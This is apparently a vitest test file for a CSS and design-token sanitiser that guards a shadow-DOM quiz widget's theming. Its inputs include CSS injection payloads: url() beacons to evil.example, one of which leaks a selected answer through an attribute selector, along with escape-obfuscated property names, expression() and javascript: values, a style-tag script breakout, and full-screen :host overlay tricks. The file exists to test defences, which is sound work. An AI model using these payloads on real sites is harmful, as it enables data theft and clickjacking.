import { describe, expect, it } from "vitest";
import {
  BACKDROP_LOCK,
  HOST_CONTAINMENT,
  MODAL_LOCK,
  installThemeCss,
  lockStyles,
  isSafeTokenValue,
  sanitizeThemeCss,
  themeCssText,
  tokensToCss,
} from "./theme-css-safety";

describe("isSafeTokenValue", () => {
  it.each(["#10b981", "attr(data-x[y])", "0", "12px", "rgb(1 2 3 / 50%)", "calc(1rem + 2px)", '"Inter", sans-serif', "none", "var(--x)"])(
    "keeps %s",
    (v) => expect(isSafeTokenValue(v)).toBe(true),
  );

  it.each([
    "red; } :host { position: fixed }",
    "red}",
    "{",
    "a<b",
    "a>b",
    "\\75 rl(x)",
    "url(https://evil.example/p.gif)",
    "URL( https://evil.example )",
    'image-set("https://evil.example/x.png" 1x)',
    "-webkit-image-set('x' 1x)",
    "image('x.png')",
    "cross-fade(a, b)",
    "src('x')",
    "expression(alert(1))",
    "@import 'x'",
    "red /* x */",
    "javascript:alert(1)",
    "calc(1px",
    '"open',
    "a)",
    42,
    null,
  ])("drops %s", (v) => expect(isSafeTokenValue(v)).toBe(false));
});

describe("tokensToCss", () => {
  it("drops unsafe values and names, keeps the rest", () => {
    const css = tokensToCss({
      "--qaid-q-card-radius": "4px",
      "--qaid-q-accent": "red; } :host { position: fixed; inset: 0 } x {",
      "--qaid-q-bg": "url(https://evil.example/t.gif)",
      "--x: y; } a { b": "1",
      color: "red",
    });
    expect(css).toBe(":where(.qaid-q-root) {\n  --qaid-q-card-radius: 4px;\n}");
  });

  it("is empty when nothing survives", () => {
    expect(tokensToCss({ "--a": "url(x)" })).toBe("");
    expect(tokensToCss(null)).toBe("");
  });
});

describe("sanitizeThemeCss", () => {
  it("keeps ordinary theme CSS", () => {
    const css = sanitizeThemeCss(
      ".qaid-q-card { outline: 1px solid red; } @media (max-width: 600px) { .qaid-q-card { padding: 0 } }",
    );
    expect(css).toContain("outline: 1px solid red;");
    expect(css).toContain("@media (max-width: 600px) {");
    expect(css).toContain("padding: 0;");
  });

  it("drops a url() that leaks a chosen answer through an attribute selector", () => {
    const css = sanitizeThemeCss(
      '.qaid-q-option[data-value^="a"][aria-checked="true"] { background: url(https://evil.example/?a); color: red }',
    );
    expect(css).not.toMatch(/url\(/i);
    expect(css).toContain("color: red;");
  });

  it.each([
    "background: url('https://evil.example/x')",
    'background-image: URL("//evil.example/x")',
    "background: u\\72l(https://evil.example/x)",
    "background: \\75 rl(https://evil.example/x)",
    'background: image-set("https://evil.example/x" 1x)',
    'background: -webkit-image-set("https://evil.example/x" 1x)',
    "width: expression(alert(1))",
    "behavior: url(x.htc)",
    "-moz-binding: url(x.xml#a)",
    "position: fixed",
    "position: FIXED !important",
    "position: sticky",
    "posit\\69on: fixed",
    "background: javascript:alert(1)",
  ])("drops `%s`", (decl) => {
    const css = sanitizeThemeCss(`:host { ${decl}; color: blue }`);
    expect(css).toBe(":host {\n  color: blue;\n}");
  });

  it("keeps url(#id), a same-document reference", () => {
    expect(sanitizeThemeCss(".x { filter: url(#blur) }")).toContain("filter: url(#blur);");
  });

  it("keeps other positions", () => {
    expect(sanitizeThemeCss(".x { position: relative }")).toContain("position: relative;");
  });

  it("drops @import in every spelling, @charset and @namespace", () => {
    const css = sanitizeThemeCss(
      '@import url(https://evil.example/a.css); @IMPORT "b.css"; @\\69mport "c.css"; @charset "utf-8"; @namespace x url(y); .ok { color: red }',
    );
    expect(css).toBe(".ok {\n  color: red;\n}");
  });

  it("strips comments, </style and HTML comment markers", () => {
    const css = sanitizeThemeCss(
      ".a { color: red } /* x */ </style><script>alert(1)</script> <!-- --> .b { color: blue }",
    );
    expect(css).not.toMatch(/<\/style|<!--|-->|\/\*/i);
    expect(css).toContain(".b {\n  color: blue;\n}");
  });

  it("keeps a media range that uses <", () => {
    expect(sanitizeThemeCss("@media (width < 600px) { .a { color: red } }")).toContain("@media (width < 600px) {");
  });

  it("strips a </style hidden by nesting", () => {
    expect(sanitizeThemeCss(".a{} <</style/style")).not.toMatch(/<\/style/i);
  });

  it("closes an unterminated block so it cannot swallow later layers", () => {
    const css = sanitizeThemeCss("@media all { .a { color: red");
    expect(css).toBe("@media all {\n.a {\n  color: red;\n}\n}");
  });

  it("skips a stray closing brace instead of ending a block early", () => {
    expect(sanitizeThemeCss("} } .a { color: red }")).toBe(".a {\n  color: red;\n}");
  });

  it("checks nested rules and @font-face sources", () => {
    const css = sanitizeThemeCss(
      ".a { color: red; &:hover { background: url(x) } } @font-face { font-family: X; src: url(https://evil.example/f.woff) }",
    );
    expect(css).not.toMatch(/url\(/);
    expect(css).toContain("color: red;");
  });

  it("decodes every kind of escape before checking", () => {
    // \t is a plain escaped letter, \0 is not a code point, \<newline> is a
    // line continuation; none may hide a banned word.
    expect(sanitizeThemeCss(":host { posi\\tion: fixed; color: red }")).toBe(":host {\n  color: red;\n}");
    expect(sanitizeThemeCss('.a { content: "\\0" }')).toContain('content: "\\0";');
    expect(sanitizeThemeCss(".a { background: u\\\nrl(x) }")).toBe(".a {\n\n}");
  });

  it("reads past an escaped quote inside a string", () => {
    expect(sanitizeThemeCss('.a { content: "a\\"; b" ; color: red }')).toContain("color: red;");
  });

  it("keeps an @layer statement, drops other statement at-rules and junk", () => {
    const css = sanitizeThemeCss("@layer base, theme; @foo bar; .a { junk; :x; color: red }");
    expect(css).toBe("@layer base, theme;\n.a {\n  color: red;\n}");
  });

  it("drops an @import written with a block, and a block with no selector", () => {
    expect(sanitizeThemeCss("@import url(x) { .a { color: red } } { color: blue } .b { color: green }")).toBe(
      ".b {\n  color: green;\n}",
    );
  });

  // The host carries the containment (contain: paint, inline !important),
  // and a shadow-tree !important beats it, so a :host rule may only set
  // inherited text and colour properties and custom properties.
  it.each([
    "contain: none !important",
    "overflow: visible",
    "clip-path: none",
    "clip: auto",
    "width: 100vw",
    "height: 100vh",
    "margin: -500px",
    "transform: scale(10)",
    "translate: -50vw",
    "z-index: 2147483647",
    "position: absolute",
    "outline: 9999px solid white",
    "box-shadow: 0 0 0 9999px white",
    "display: contents",
    "con\\74 ain: none",
  ])("drops `%s` from a :host rule", (decl) => {
    expect(sanitizeThemeCss(`:host { ${decl}; color: blue; --qaid-q-accent: red }`)).toBe(
      ":host {\n  color: blue;\n  --qaid-q-accent: red;\n}",
    );
  });

  it.each([
    ":host(.x)",
    ":host-context(body)",
    ":is(:host, .a)",
    ":\\68 ost",
    "@media all { :host",
  ])("treats `%s` as the host", (sel) => {
    const close = sel.startsWith("@media") ? "} }" : "}";
    const css = sanitizeThemeCss(`${sel} { width: 100vw; font-family: serif ${close}`);
    expect(css).not.toContain("width");
    expect(css).toContain("font-family: serif;");
  });

  it("keeps the safe :host properties", () => {
    const css = sanitizeThemeCss(
      ":host { --qaid-q-card-bg: #fff; color: red; color-scheme: dark; font: 14px serif; font-size: 15px; line-height: 1.4; letter-spacing: 0.01em }",
    );
    for (const decl of ["--qaid-q-card-bg: #fff;", "color: red;", "color-scheme: dark;", "font: 14px serif;", "font-size: 15px;", "line-height: 1.4;", "letter-spacing: 0.01em;"]) {
      expect(css).toContain(decl);
    }
  });

  it("follows the host into nested rules that still mean it, not into descendants", () => {
    const css = sanitizeThemeCss(
      ":host { &:hover { margin: -9px } @media all { transform: scale(3) } .qaid-q-card { margin: 4px } }",
    );
    expect(css).not.toContain("-9px");
    expect(css).not.toContain("scale");
    expect(css).toContain("margin: 4px;");
  });

  it("leaves geometry alone on elements inside the shadow root (containment clips them)", () => {
    expect(sanitizeThemeCss(".qaid-q-card { position: absolute; width: 100vw; margin: -50px }")).toBe(
      ".qaid-q-card {\n  position: absolute;\n  width: 100vw;\n  margin: -50px;\n}",
    );
  });

  it("drops @scope rules, whose :scope can be the shadow host", () => {
    expect(sanitizeThemeCss("@scope { :scope { outline: 9999px solid red } } .a { color: red }")).toBe(
      ".a {\n  color: red;\n}",
    );
    expect(sanitizeThemeCss("@\\73 cope (.x) { .y { color: red } }")).toBe("");
  });

  it("is empty for non-strings and blank input", () => {
    expect(sanitizeThemeCss(undefined)).toBe("");
    expect(sanitizeThemeCss("   ")).toBe("");
  });
});

describe("installThemeCss", () => {
  it("adopts a constructed stylesheet when the browser has them", () => {
    const host = document.createElement("div");
    const root = host.attachShadow({ mode: "open" });
    installThemeCss(root, ".a { color: red; }");
    expect(root.adoptedStyleSheets).toHaveLength(1);
    expect(root.querySelector("style")).toBeNull();
    expect(themeCssText(root)).toBe(".a { color: red; }");
  });

  it("falls back to a <style> set through textContent", () => {
    const host = document.createElement("div");
    const root = host.attachShadow({ mode: "open" });
    Object.defineProperty(root, "adoptedStyleSheets", { value: undefined });
    installThemeCss(root, ".a { color: red; }");
    const style = root.querySelector("style[data-qaid-q-theme]");
    expect(style?.textContent).toBe(".a { color: red; }");
    expect(themeCssText(root)).toBe(".a { color: red; }");
  });

  it("reports no theme CSS when none was installed", () => {
    const root = document.createElement("div").attachShadow({ mode: "open" });
    expect(themeCssText(root)).toBeNull();
  });
});

describe("lockStyles", () => {
  it("sets each style inline with !important", () => {
    const el = document.createElement("div");
    lockStyles(el, { contain: "paint", inset: "0" });
    expect(el.style.getPropertyValue("contain")).toBe("paint");
    expect(el.style.getPropertyPriority("contain")).toBe("important");
    expect(el.style.getPropertyPriority("inset")).toBe("important");
  });

  it("locks paint containment on the host and the modal geometry", () => {
    expect(HOST_CONTAINMENT).toEqual({ contain: "paint", "overflow-clip-margin": "40px" });
    expect(BACKDROP_LOCK).toMatchObject({ position: "fixed", inset: "0", transform: "none" });
    expect(MODAL_LOCK).toMatchObject({ width: "var(--qaid-modal-width, 480px)", transform: "translate(-50%, -50%)" });
  });
});
